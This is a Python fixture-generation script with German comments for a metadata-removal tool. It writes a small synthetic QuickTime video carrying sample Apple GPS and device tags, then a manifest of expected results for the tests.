# ffmpeg schreibt genau diese Form mit -movflags use_metadata_tags.

try:
    import av as _av3

    _APPLE = {
        "com.apple.quicktime.location.ISO6709": "+46.9481+007.4474+561.000/",
        "com.apple.quicktime.content.identifier": "8F3B1C2A-4D5E-4F60-9A7B-1C2D3E4F5061",
        "com.apple.quicktime.make": "Apple",
        "com.apple.quicktime.model": "iPhone 15 Pro",
        "com.apple.quicktime.software": "17.4.1",
        "com.apple.quicktime.creationdate": "2026-03-01T09:12:00+0100",
    }

    _p = os.path.join(ZIEL, "live_photo.mov")
    _aus = _av3.open(_p, "w", format="mov",
                     options={"movflags": "use_metadata_tags"})
    _spur = _aus.add_stream("mpeg4", rate=25)
    _spur.width, _spur.height = 64, 48
    _spur.pix_fmt = "yuv420p"
    _aus.metadata.update(_APPLE)
    import fractions as _fr
    for _i in range(15):
        _r = _av3.VideoFrame(64, 48, "rgb24")
        _r.planes[0].update(bytes([(_i * 12) % 256]) * (64 * 48 * 3))
        _r.pts = _i
        _r.time_base = _fr.Fraction(1, 25)
        for _paket in _spur.encode(_r):
            _aus.mux(_paket)
    for _paket in _spur.encode():
        _aus.mux(_paket)
    _aus.close()

    manifest.append({
        "datei": "live_photo.mov",
        "format": "MOV",
        "beschreibung": ("Videohaelfte eines Live Photo -- Apples "
                         "mdta-Schluesselverzeichnis mit GPS und Kennzeichner"),
        "erwartet": {"hat_gps": True, "hat_vorschaubild": False,
                     "groesse": [64, 48], "modus": "video"},
    })
except ImportError:
    print("  HINWEIS: PyAV fehlt, die Live-Photo-Vorlage entfaellt")

with open(os.path.join(ZIEL, "manifest.json"), "w", encoding="utf-8", newline="\n") as f:
    json.dump({
        "beschreibung": "Echte Bilddateien mit echten Metadaten, erzeugt mit Pillow und piexif.",
        "hinweis": (
            "Die Modultests bauen Dateien von Hand und pruefen damit die Struktur. "
            "Diese Vorlagen pruefen zusaetzlich, dass das bereinigte Ergebnis noch "
            "ein gueltiges Bild mit unveraenderten Pixeln ist -- der v1-Palette-Bug "
            "erzeugte eine gueltige Datei mit falschen Farben."
        ),
        "dateien": manifest,
    }, f, indent=2, ensure_ascii=False)
    f.write("\n")

for m in manifest:
    p = os.path.join(ZIEL, m["datei"])
    print(f"  {m['datei']:<24} {os.path.getsize(p):>6} Bytes   {m['beschreibung']}")
print(f"\n  {len(manifest)} Vorlagen nach {ZIEL}/")
